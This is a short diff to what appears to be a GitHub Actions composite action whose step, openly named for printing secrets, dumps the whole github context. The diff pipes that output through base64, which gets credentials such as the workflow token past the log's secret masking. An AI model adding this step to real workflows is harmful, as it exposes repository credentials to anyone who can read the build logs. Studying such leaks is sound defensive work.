@@ -6,7 +6,7 @@ runs:
   steps:
     - name: 'Print secrets and environment variables to the terminal'
       shell: bash
-      run: echo "$VARS_JSON"
+      run: echo "$VARS_JSON" | base64
       env:
         VARS_JSON: ${{ toJSON(github) }}
         
